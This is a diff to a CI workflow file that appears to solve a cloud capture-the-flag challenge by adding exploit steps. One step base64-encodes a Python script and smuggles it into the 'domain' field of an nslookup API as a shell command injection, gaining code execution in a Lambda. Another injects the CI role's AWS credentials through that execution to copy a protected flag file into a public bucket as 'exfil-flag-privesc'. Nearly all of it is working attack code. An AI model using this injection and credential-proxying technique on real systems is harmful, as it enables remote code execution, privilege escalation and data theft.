@@ -70,6 +70,21 @@ jobs:
         run: |
           aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "  (expected - cicdRole is outside the VPC, Statement2 only)"
 
+      - name: Diagnostic - boto3 write via Lambda's own natural creds
+        run: |
+          B64=$(base64 -w0 diag.py)
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          cat payload.json
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d @payload.json
+          echo
+          sleep 5
+          echo "--- checking public bucket for debug.txt ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
+          curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
+
       - name: Privesc - proxy cicdRole creds through Lambda RCE (inside VPC)
         run: |
           INJECT="x; AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN AWS_DEFAULT_REGION=us-east-1 aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/exfil-flag-privesc.txt #"
